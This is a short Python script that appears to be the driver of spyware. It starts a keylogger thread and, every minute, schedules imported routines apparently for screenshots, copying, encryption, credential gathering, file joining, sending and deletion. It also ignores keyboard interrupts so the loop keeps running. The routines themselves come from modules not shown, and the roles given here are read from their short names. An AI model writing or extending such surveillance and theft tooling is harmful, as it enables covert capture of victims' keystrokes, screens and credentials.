from threading import *

import schedule
import time as tm
from datetime import time, timedelta, datetime
#
from d3 import keylog
#
from e2 import ss
from e3 import cop1
from e6 import enk
from e4 import cre
from e10 import joi
from f3 import sem
from e11 import del2

#
t1 = Thread(target=keylog)
#keylog()
#
    
schedule.every(1).minutes.do(ss)
#schedule.every(5).seconds.do(ss)

schedule.every(1).minutes.do(cop1)
schedule.every(1).minutes.do(enk)
schedule.every(1).minutes.do(cre)
schedule.every(1).minutes.do(joi)
schedule.every(1).minutes.do(sem)
schedule.every(1).minutes.do(del2)
#schedule.every(1).minutes.do(keylog)
t1.start()
t1.join()
while True:
    try:
        #keylog()
        schedule.run_pending()
        #keylog()
        #tm.sleep(2)
        
    except KeyboardInterrupt:
        continue